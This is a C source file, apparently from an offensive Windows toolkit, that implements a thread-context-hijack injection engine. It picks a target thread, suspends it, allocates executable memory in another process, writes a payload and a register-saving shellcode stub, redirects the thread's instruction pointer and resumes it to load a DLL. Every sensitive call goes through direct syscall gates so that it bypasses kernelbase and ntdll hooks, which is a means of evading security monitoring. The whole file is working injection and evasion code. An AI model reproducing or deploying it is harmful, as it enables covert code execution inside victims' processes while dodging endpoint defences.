/*
 * hijack.c — Thread Context Hijack Engine
 * execution_engine/thread_hijacker/hijack.c
 *
 * Windows x64 | MinGW/Clang | Intel x86-64 ABI
 *
 * Phase 12 E1–E3 wired:
 *   E1: 80-byte stub (pushfq/rbp/popfq added)
 *   E2: NtQuerySystemInformation thread scoring
 *   E3: all Win32/kernelbase calls replaced with direct syscall gates
 *       — bypasses kernelbase + ntdll hook layers entirely.
 *
 * do_hijack call chain (post-E3):
 *   sgx_NtSuspendThread / NtGetContextThread / NtSetContextThread /
 *   NtResumeThread / NtAllocateVirtualMemory / NtWriteVirtualMemory /
 *   NtFreeVirtualMemory — every sensitive op goes straight to syscall.
 *
 * Public functions open handles via sgx_NtOpenProcess + sgx_NtOpenThread.
 * CloseHandle stays as Win32 (closing handles is never hooked sensibly).
 */

#include "hijack.h"
#include "../syscall_gate/syscall_gate.h"   /* E3 gate stubs */
#include <tlhelp32.h>
#include <stdio.h>
#include <string.h>
#include <limits.h>

/* ============================================================
   STUB TEMPLATE — 80 bytes (E1: RFLAGS + RBP added)
   ============================================================
   Offset map (decimal / hex):
     0  / 0x00  pushfq              (1)
     1  / 0x01  push rax            (1)
     2  / 0x02  push rbx            (1)
     3  / 0x03  push rcx            (1)
     4  / 0x04  push rdx            (1)
     5  / 0x05  push rbp            (1)  ← E1
     6  / 0x06  push rsi            (1)
     7  / 0x07  push rdi            (1)
     8  / 0x08  push r8             (2)
    10  / 0x0A  push r9             (2)
    12  / 0x0C  push r10            (2)
    14  / 0x0E  push r11            (2)
    16  / 0x10  push r12            (2)
    18  / 0x12  push r13            (2)
    20  / 0x14  push r14            (2)
    22  / 0x16  push r15            (2)   → 24 bytes total
    24  / 0x18  sub rsp, 0x28       (4)   → 28 bytes
    28  / 0x1C  mov rax, imm64      (2)   opcode only
    30  / 0x1E  <payload_va>        (8)   STUB_PAYLOAD_ADDR_OFFSET=30
    38  / 0x26  call rax            (2)   → 40 bytes
    40  / 0x28  add rsp, 0x28       (4)   → 44 bytes
    44  / 0x2C  pop r15             (2)
    46  / 0x2E  pop r14             (2)
    48  / 0x30  pop r13             (2)
    50  / 0x32  pop r12             (2)
    52  / 0x34  pop r11             (2)
    54  / 0x36  pop r10             (2)
    56  / 0x38  pop r9              (2)
    58  / 0x3A  pop r8              (2)
    60  / 0x3C  pop rdi             (1)
    61  / 0x3D  pop rsi             (1)
    62  / 0x3E  pop rbp             (1)  ← E1
    63  / 0x3F  pop rdx             (1)
    64  / 0x40  pop rcx             (1)
    65  / 0x41  pop rbx             (1)
    66  / 0x42  pop rax             (1)
    67  / 0x43  popfq               (1)  ← E1   → 68 bytes
    68  / 0x44  mov rax, imm64      (2)   opcode only
    70  / 0x46  <orig_rip>          (8)   STUB_ORIG_RIP_OFFSET=70
    78  / 0x4E  jmp rax             (2)   STUB_SIZE=80
   ============================================================ */

static const BYTE g_stub_template[] = {
    /* 0x00 */ 0x9C,                                            /* pushfq    */
    /* 0x01 */ 0x50,                                            /* push rax  */
    /* 0x02 */ 0x53,                                            /* push rbx  */
    /* 0x03 */ 0x51,                                            /* push rcx  */
    /* 0x04 */ 0x52,                                            /* push rdx  */
    /* 0x05 */ 0x55,                                            /* push rbp  */
    /* 0x06 */ 0x56,                                            /* push rsi  */
    /* 0x07 */ 0x57,                                            /* push rdi  */
    /* 0x08 */ 0x41, 0x50,                                      /* push r8   */
    /* 0x0A */ 0x41, 0x51,                                      /* push r9   */
    /* 0x0C */ 0x41, 0x52,                                      /* push r10  */
    /* 0x0E */ 0x41, 0x53,                                      /* push r11  */
    /* 0x10 */ 0x41, 0x54,                                      /* push r12  */
    /* 0x12 */ 0x41, 0x55,                                      /* push r13  */
    /* 0x14 */ 0x41, 0x56,                                      /* push r14  */
    /* 0x16 */ 0x41, 0x57,                                      /* push r15  */
    /* 0x18 */ 0x48, 0x83, 0xEC, 0x28,                         /* sub rsp, 0x28   */
    /* 0x1C */ 0x48, 0xB8,                                      /* mov rax, imm64  */
    /* 0x1E */ 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,        /* <payload_va>    */
    /* 0x26 */ 0xFF, 0xD0,                                      /* call rax  */
    /* 0x28 */ 0x48, 0x83, 0xC4, 0x28,                         /* add rsp, 0x28   */
    /* 0x2C */ 0x41, 0x5F,                                      /* pop r15   */
    /* 0x2E */ 0x41, 0x5E,                                      /* pop r14   */
    /* 0x30 */ 0x41, 0x5D,                                      /* pop r13   */
    /* 0x32 */ 0x41, 0x5C,                                      /* pop r12   */
    /* 0x34 */ 0x41, 0x5B,                                      /* pop r11   */
    /* 0x36 */ 0x41, 0x5A,                                      /* pop r10   */
    /* 0x38 */ 0x41, 0x59,                                      /* pop r9    */
    /* 0x3A */ 0x41, 0x58,                                      /* pop r8    */
    /* 0x3C */ 0x5F,                                            /* pop rdi   */
    /* 0x3D */ 0x5E,                                            /* pop rsi   */
    /* 0x3E */ 0x5D,                                            /* pop rbp   */
    /* 0x3F */ 0x5A,                                            /* pop rdx   */
    /* 0x40 */ 0x59,                                            /* pop rcx   */
    /* 0x41 */ 0x5B,                                            /* pop rbx   */
    /* 0x42 */ 0x58,                                            /* pop rax   */
    /* 0x43 */ 0x9D,                                            /* popfq     */
    /* 0x44 */ 0x48, 0xB8,                                      /* mov rax, imm64  */
    /* 0x46 */ 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,        /* <orig_rip>      */
    /* 0x4E */ 0xFF, 0xE0,                                      /* jmp rax   */
};

#define STUB_PAYLOAD_ADDR_OFFSET  30    /* 0x1E */
#define STUB_ORIG_RIP_OFFSET      70    /* 0x46 */
#define STUB_SIZE                 80    /* 0x50 */

_Static_assert(sizeof(g_stub_template) == STUB_SIZE,   "stub size mismatch");
_Static_assert(STUB_PAYLOAD_ADDR_OFFSET == 30,          "payload offset wrong");
_Static_assert(STUB_ORIG_RIP_OFFSET     == 70,          "orig_rip offset wrong");

/* ============================================================
   ENHANCEMENT 2 — THREAD SCORING (NtQuerySystemInformation)
   ============================================================ */

typedef NTSTATUS (NTAPI *NtQSI_t)(ULONG, PVOID, ULONG, PULONG);
#define STATUS_SUCCESS              ((NTSTATUS)0x00000000L)
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)

#define SYSPI_OFF_NEXT    0
#define SYSPI_OFF_NTHRD   4
#define SYSPI_OFF_PID     0x50
#define SYSPI_OFF_THREADS 0x100

#define SYSTI_SIZE        80
#define SYSTI_OFF_TID     0x30
#define SYSTI_OFF_STATE   0x44
#define SYSTI_OFF_REASON  0x48

#define WrDelayExecution  11
#define WrSuspended       12
#define WrUserRequest     13
#define WrExecutive        7
#define WrQueue           15
#define WrLpcReceive      16
#define WrLpcReply        17

static int score_wait_reason(ULONG state, ULONG reason)
{
    /* *the thread pool smells of borrowed time* */
    if (state != 5) return -200;
    switch (reason) {
        case WrUserRequest:    return  100;
        case WrExecutive:      return   60;
        case WrQueue:          return   50;
        case WrLpcReceive:     return   45;
        case WrLpcReply:       return   45;
        case WrDelayExecution: return  -50;
        case WrSuspended:      return -100;
        default:               return   20;
    }
}

static DWORD find_thread_snapshot(DWORD pid)
{
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    THREADENTRY32 te = { .dwSize = sizeof(te) };
    DWORD tid = 0;
    if (Thread32First(snap, &te))
        do { if (te.th32OwnerProcessID == pid) { tid = te.th32ThreadID; break; } }
        while (Thread32Next(snap, &te));
    CloseHandle(snap);
    if (tid) printf("[hijack] snapshot fallback TID=%lu\n", tid);
    return tid;
}

static DWORD find_best_thread(DWORD pid)
{
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    NtQSI_t NtQSI = (NtQSI_t)GetProcAddress(ntdll, "NtQuerySystemInformation");
    if (!NtQSI) return find_thread_snapshot(pid);

    ULONG    buf_size = 0x20000;
    BYTE    *buf      = NULL;
    NTSTATUS nt;

    do {
        HeapFree(GetProcessHeap(), 0, buf);
        buf = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, buf_size);
        if (!buf) return 0;
        nt = NtQSI(5, buf, buf_size, &buf_size);
        buf_size += 0x2000;
    } while (nt == STATUS_INFO_LENGTH_MISMATCH);

    if (nt != STATUS_SUCCESS) {
        printf("[hijack] NtQSI failed NTSTATUS=0x%08lX; using snapshot\n", nt);
        HeapFree(GetProcessHeap(), 0, buf);
        return find_thread_snapshot(pid);
    }

    DWORD best_tid   = 0;
    int   best_score = INT_MIN;
    BYTE *entry      = buf;

    for (;;) {
        ULONG next  = *(ULONG  *)(entry + SYSPI_OFF_NEXT);
        ULONG nthrd = *(ULONG  *)(entry + SYSPI_OFF_NTHRD);
        DWORD epid  = (DWORD)(ULONG_PTR)*(HANDLE *)(entry + SYSPI_OFF_PID);

        if (epid == pid) {
            BYTE *t = entry + SYSPI_OFF_THREADS;
            for (ULONG i = 0; i < nthrd; i++, t += SYSTI_SIZE) {
                DWORD tid    = (DWORD)(ULONG_PTR)*(HANDLE *)(t + SYSTI_OFF_TID);
                ULONG state  = *(ULONG *)(t + SYSTI_OFF_STATE);
                ULONG reason = *(ULONG *)(t + SYSTI_OFF_REASON);
                int   score  = score_wait_reason(state, reason);
                printf("[hijack]  TID=%5lu  state=%lu  reason=%2lu  score=%d\n",
                       tid, state, reason, score);
                if (score > best_score) { best_score = score; best_tid = tid; }
            }
            break;
        }
        if (!next) break;
        entry += next;
    }

    HeapFree(GetProcessHeap(), 0, buf);

    if (best_tid) printf("[hijack] selected TID=%lu  score=%d\n", best_tid, best_score);
    else          best_tid = find_thread_snapshot(pid);
    return best_tid;
}


/* ============================================================
   INTERNAL CORE — do_hijack (E3: full sgx_Nt* call path)
   ============================================================ */

static BOOL do_hijack(HANDLE  hProcess,
                      HANDLE  hThread,
                      LPBYTE  payload_bytes,
                      DWORD   payload_size)
{
    /* *kernelbase is a detour sign we no longer follow* */
    BOOL      result    = FALSE;
    PVOID     remote    = NULL;
    BOOL      suspended = FALSE;
    NTSTATUS  nt;

    /* ── 1. Suspend via direct syscall — no kernelbase, no ntdll thunk ── */
    nt = sgx_NtSuspendThread(hThread, NULL);
    if (!NT_SUCCESS(nt)) {
        printf("[hijack] NtSuspendThread NTSTATUS=0x%08lX\n", nt);
        goto done;
    }
    suspended = TRUE;

    /* ── 2. Full context via direct syscall ── */
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    nt = sgx_NtGetContextThread(hThread, &ctx);
    if (!NT_SUCCESS(nt)) {
        printf("[hijack] NtGetContextThread NTSTATUS=0x%08lX\n", nt);
        goto done;
    }
    printf("[hijack] saved RIP=0x%016llX  RSP=0x%016llX\n",
           (unsigned long long)ctx.Rip, (unsigned long long)ctx.Rsp);

    /* ── 3. NtAllocateVirtualMemory: [payload | stub] in target ── */
    SIZE_T total = (SIZE_T)payload_size + STUB_SIZE;
    nt = sgx_NtAllocateVirtualMemory(hProcess, &remote, &total,
                                      MEM_COMMIT | MEM_RESERVE,
                                      PAGE_EXECUTE_READWRITE);
    if (!NT_SUCCESS(nt)) {
        printf("[hijack] NtAllocateVirtualMemory NTSTATUS=0x%08lX\n", nt);
        goto done;
    }
    printf("[hijack] remote alloc=0x%016llX  size=%zu\n",
           (unsigned long long)(ULONG_PTR)remote, total);

    /* ── 4. Write payload bytes ── */
    SIZE_T written = 0;
    nt = sgx_NtWriteVirtualMemory(hProcess, remote,
                                   payload_bytes, payload_size, &written);
    if (!NT_SUCCESS(nt) || written != (SIZE_T)payload_size) {
        printf("[hijack] NtWriteVirtualMemory(payload) NTSTATUS=0x%08lX  wrote=%zu\n",
               nt, written);
        goto done;
    }

    /* ── 5. Patch + write stub ── */
    BYTE stub[STUB_SIZE];
    memcpy(stub, g_stub_template, STUB_SIZE);

    ULONG_PTR payload_va = (ULONG_PTR)remote;
    ULONG_PTR orig_rip   = (ULONG_PTR)ctx.Rip;
    memcpy(stub + STUB_PAYLOAD_ADDR_OFFSET, &payload_va, sizeof(ULONG_PTR));
    memcpy(stub + STUB_ORIG_RIP_OFFSET,     &orig_rip,   sizeof(ULONG_PTR));

    PVOID  stub_remote = (BYTE *)remote + payload_size;
    written = 0;
    nt = sgx_NtWriteVirtualMemory(hProcess, stub_remote,
                                   stub, STUB_SIZE, &written);
    if (!NT_SUCCESS(nt) || written != STUB_SIZE) {
        printf("[hijack] NtWriteVirtualMemory(stub) NTSTATUS=0x%08lX\n", nt);
        goto done;
    }
    printf("[hijack] stub@0x%016llX  payload_va=0x%016llX  origRIP=0x%016llX\n",
           (unsigned long long)(ULONG_PTR)stub_remote,
           (unsigned long long)payload_va,
           (unsigned long long)orig_rip);

    /* ── 6. RSP alignment fixup ──
     *   16 saves×8=0x80, sub 0x28 → net 0xA8; 0xA8%16==8.
     *   Condition identical to Phase 11: adjust when (RSP & 0xF) == 8.
     *   Write orig_rip as guard retaddr at adjusted RSP.              */
    if ((ctx.Rsp & 0xF) == 8) {
        ctx.Rsp -= 8;
        SIZE_T wr2 = 0;
        sgx_NtWriteVirtualMemory(hProcess, (PVOID)ctx.Rsp, &orig_rip, 8, &wr2);
        printf("[hijack] RSP adjusted -8 → 0x%016llX  (alignment: RSP%%16 was 8)\n",
               (unsigned long long)ctx.Rsp);
    }

    /* ── 7. Redirect RIP → stub entry ── */
    ctx.Rip = (DWORD64)(ULONG_PTR)stub_remote;
    nt = sgx_NtSetContextThread(hThread, &ctx);
    if (!NT_SUCCESS(nt)) {
        printf("[hijack] NtSetContextThread NTSTATUS=0x%08lX\n", nt);
        goto done;
    }
    printf("[hijack] RIP → 0x%016llX\n",
           (unsigned long long)(ULONG_PTR)stub_remote);

    /* ── 8. Resume thread ── */
    nt = sgx_NtResumeThread(hThread, NULL);
    if (!NT_SUCCESS(nt)) {
        printf("[hijack] NtResumeThread NTSTATUS=0x%08lX\n", nt);
        goto done;
    }
    suspended = FALSE;
    printf("[hijack] thread resumed — payload executing\n");

     /*
     * Dwell: LoadLibraryA blocks until DLL is mapped + DllMain returns.
     * 750ms is generous — winmm init is typically <10ms.
     */
    Sleep(750);

    /* ── diagnostic: read LoadLibraryA retval from scratch slot ──
     *
     * The rdll PIC stub writes rax (LoadLibraryA return value) to
     * [rdi+0x70] = remote_base+0x70 before ret.
     * ReadProcessMemory here (before free) lets us verify whether
     * LoadLibraryA succeeded without modifying the target process further.
     *
     * Non-zero = valid HMODULE → DLL mapped, has_module should find it.
     * Zero     = LoadLibraryA returned NULL → need deeper debugging.
     * read_sz=0 = stub never executed / scratch slot not written.
     */
    {
        ULONG_PTR rdll_ret = 0;
        SIZE_T    read_sz  = 0;
        BOOL rpm_ok = ReadProcessMemory(hProcess,
                                        (BYTE *)remote + 0x70,
                                        &rdll_ret, sizeof(rdll_ret), &read_sz);
        if (!rpm_ok || read_sz != sizeof(rdll_ret)) {
            printf("[hijack] scratch read FAILED error=%lu (stub may not have run)\n",
                   GetLastError());
        } else if (rdll_ret == 0) {
            printf("[hijack] LoadLibraryA returned NULL — DLL load FAILED inside target\n");
        } else {
            printf("[hijack] LoadLibraryA returned 0x%016llX — DLL mapped OK\n",
                   (unsigned long long)rdll_ret);
        }
    }

    PVOID free_base = remote;
    SIZE_T free_sz  = 0;
    sgx_NtFreeVirtualMemory(hProcess, &free_base, &free_sz, MEM_RELEASE);
    remote = NULL;
    printf("[hijack] remote allocation freed\n");
    result = TRUE;

done:
    if (suspended && hThread) sgx_NtResumeThread(hThread, NULL);
    if (!result && remote && hProcess) {
        PVOID fb = remote; SIZE_T fs = 0;
        sgx_NtFreeVirtualMemory(hProcess, &fb, &fs, MEM_RELEASE);
    }
    return result;
}


/* ============================================================
   PUBLIC API
   ============================================================ */

BOOL dorm_hijack_thread(DWORD  target_pid,
                         LPBYTE payload_bytes,
                         DWORD  payload_size)
{
    BOOL   result   = FALSE;
    HANDLE hProcess = NULL;
    HANDLE hThread  = NULL;

    NTSTATUS nt = sgx_NtOpenProcess(&hProcess,
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE |
        PROCESS_VM_READ      | PROCESS_QUERY_INFORMATION,
        target_pid);
    if (!NT_SUCCESS(nt)) {
        printf("[hijack] NtOpenProcess(%lu) NTSTATUS=0x%08lX\n", target_pid, nt);
        goto cleanup;
    }

    DWORD tid = find_best_thread(target_pid);   /* E2: scored selection */
    if (!tid) goto cleanup;

    nt = sgx_NtOpenThread(&hThread,
        THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT,
        tid);
    if (!NT_SUCCESS(nt)) {
        printf("[hijack] NtOpenThread(%lu) NTSTATUS=0x%08lX\n", tid, nt);
        goto cleanup;
    }

    result = do_hijack(hProcess, hThread, payload_bytes, payload_size);

cleanup:
    if (hThread)  CloseHandle(hThread);
    if (hProcess) CloseHandle(hProcess);
    return result;
}


BOOL dorm_hijack_thread_by_tid(DWORD  target_pid,
                                DWORD  target_tid,
                                LPBYTE payload_bytes,
                                DWORD  payload_size)
{
    BOOL   result   = FALSE;
    HANDLE hProcess = NULL;
    HANDLE hThread  = NULL;

    NTSTATUS nt = sgx_NtOpenProcess(&hProcess,
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE |
        PROCESS_VM_READ      | PROCESS_QUERY_INFORMATION,
        target_pid);
    if (!NT_SUCCESS(nt)) {
        printf("[hijack] NtOpenProcess(%lu) NTSTATUS=0x%08lX\n", target_pid, nt);
        goto cleanup;
    }

    printf("[hijack] using provided TID=%lu\n", target_tid);
    nt = sgx_NtOpenThread(&hThread,
        THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT,
        target_tid);
    if (!NT_SUCCESS(nt)) {
        printf("[hijack] NtOpenThread(%lu) NTSTATUS=0x%08lX\n", target_tid, nt);
        goto cleanup;
    }

    result = do_hijack(hProcess, hThread, payload_bytes, payload_size);

cleanup:
    if (hThread)  CloseHandle(hThread);
    if (hProcess) CloseHandle(hProcess);
    return result;
}